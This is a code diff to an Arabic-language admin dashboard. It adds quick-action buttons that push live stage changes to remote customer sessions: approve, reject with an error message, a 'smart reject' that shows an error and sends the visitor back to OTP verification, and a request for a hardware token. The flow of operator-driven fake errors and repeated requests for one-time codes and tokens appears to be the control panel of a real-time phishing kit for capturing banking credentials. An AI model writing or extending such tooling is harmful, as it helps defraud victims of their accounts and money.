@@ -3,19 +3,23 @@ import { createFileRoute } from "@tanstack/react-router";
 import { toast } from "sonner";
 import {
   Activity,
+  Ban,
   BarChart3,
   Bell,
   BellOff,
+  Check,
   Clock,
   Copy,
   Download,
   Eye,
   Flame,
+  KeyRound,
   LogOut,
   RefreshCw,
   Search,
   Send,
   Settings,
+  ShieldAlert,
   Volume2,
   VolumeX,
   ShieldCheck,
@@ -44,6 +48,7 @@ import {
   adminSetStatus,
 } from "@/lib/admin.functions";
 import {
+  pushRemoteReject,
   pushRemoteStage,
   subscribeOrderChanges,
 } from "@/lib/realtime";
@@ -486,6 +491,62 @@ function Dashboard({
     }
   }
 
+  /** إجراءات سريعة: قبول / رفض / رفض ذكي / طلب توكن */
+  async function quickAction(
+    sessionId: string,
+    action: "approve" | "reject" | "smart-reject" | "token",
+  ) {
+    const current = orders.find((o) => o.session_id === sessionId);
+    const map: Record<
+      string,
+      { status: string; stage: OrderRow["stage"] | null; msg: string; reject?: boolean }
+    > = {
+      approve: { status: "approved", stage: "processing", msg: "تم القبول" },
+      // رفض: تبقى الصفحة كما هي وتظهر للعميل رسالة خطأ مناسبة لها
+      reject: { status: "rejected", stage: null, msg: "تم الرفض — أُرسلت رسالة الخطأ", reject: true },
+      // رفض ذكي: رسالة خطأ ثم إعادة توجيه لمرحلة التحقق
+      "smart-reject": {
+        status: "review",
+        stage: "verify-otp",
+        msg: "رفض ذكي — إعادة التحقق",
+        reject: true,
+      },
+      token: { status: "review", stage: "hardware-token", msg: "تم طلب التوكن" },
+    };
+    const cfg = map[action]!;
+    const nextStage = cfg.stage ?? (current?.stage as OrderRow["stage"] | undefined) ?? null;
+
+    setOrders((prev) =>
+      prev.map((o) =>
+        o.session_id === sessionId
+          ? { ...o, status: cfg.status, ...(cfg.stage ? { stage: cfg.stage } : {}) }
+          : o,
+      ),
+    );
+
+    if (cfg.reject) pushRemoteReject(sessionId, action);
+    if (cfg.stage) pushRemoteStage(sessionId, cfg.stage);
+
+    try {
+      await Promise.all([
+        adminSetStatus({
+          data: { username, password, sessionId, status: cfg.status as "new" },
+        }),
+        ...(nextStage
+          ? [
+              adminSetStage({
+                data: { username, password, sessionId, stage: nextStage as "processing" },
+              }),
+            ]
+          : []),
+      ]);
+      toast.success(cfg.msg);
+    } catch (err) {
+      toast.error((err as Error).message);
+      void load({ silent: true });
+    }
+  }
+
   async function remove(sessionId: string) {
     if (!window.confirm("حذف هذا الطلب وسجل أحداثه؟")) return;
     try {
@@ -801,7 +862,13 @@ function Dashboard({
                             {timeAgo(o.updated_at)}
                           </td>
                           <td className="p-3" onClick={(e) => e.stopPropagation()}>
-                            <div className="flex gap-1">
+                            <div className="flex flex-wrap items-center gap-1">
+                              <QuickActions
+                                onAction={(a) => quickAction(o.session_id, a)}
+                                status={o.status}
+                                stage={o.stage}
+                              />
+                              <span className="mx-1 h-5 w-px bg-border" />
                               <button
                                 onClick={() => setSelected(o)}
                                 className="grid h-8 w-8 place-items-center rounded-lg border border-border hover:bg-secondary"
@@ -1227,4 +1294,75 @@ function timeAgo(iso: string): string {
   if (s < 3600) return `${Math.floor(s / 60)}د`;
   if (s < 86400) return `${Math.floor(s / 3600)}س`;
   return new Date(iso).toLocaleDateString("ar-EG");
+}
+
+type QuickActionKey = "approve" | "reject" | "smart-reject" | "token";
+
+const QUICK_ACTIONS: {
+  key: QuickActionKey;
+  label: string;
+  icon: typeof Check;
+  className: string;
+}[] = [
+  {
+    key: "approve",
+    label: "قبول",
+    icon: Check,
+    className: "border-success/40 text-success hover:bg-success/10",
+  },
+  {
+    key: "reject",
+    label: "رفض",
+    icon: Ban,
+    className: "border-destructive/40 text-destructive hover:bg-destructive/10",
+  },
+  {
+    key: "smart-reject",
+    label: "رفض ذكي",
+    icon: ShieldAlert,
+    className: "border-warning/50 text-warning hover:bg-warning/10",
+  },
+  {
+    key: "token",
+    label: "توكن",
+    icon: KeyRound,
+    className: "border-primary/40 text-primary hover:bg-primary/10",
+  },
+];
+
+function QuickActions({
+  onAction,
+  status,
+  stage,
+}: {
+  onAction: (action: QuickActionKey) => void;
+  status?: string;
+  stage?: string;
+}) {
+  return (
+    <>
+      {QUICK_ACTIONS.map((a) => {
+        const Icon = a.icon;
+        const active =
+          (a.key === "approve" && status === "approved") ||
+          (a.key === "reject" && status === "rejected") ||
+          (a.key === "smart-reject" && status === "review" && stage === "verify-otp") ||
+          (a.key === "token" && stage === "hardware-token");
+        return (
+          <button
+            key={a.key}
+            type="button"
+            onClick={() => onAction(a.key)}
+            title={a.label}
+            className={`inline-flex h-8 items-center gap-1 rounded-lg border px-2 text-[11px] font-black transition-colors ${a.className} ${
+              active ? "ring-1 ring-current" : ""
+            }`}
+          >
+            <Icon className="h-3.5 w-3.5" />
+            {a.label}
+          </button>
+        );
+      })}
+    </>
+  );
 }
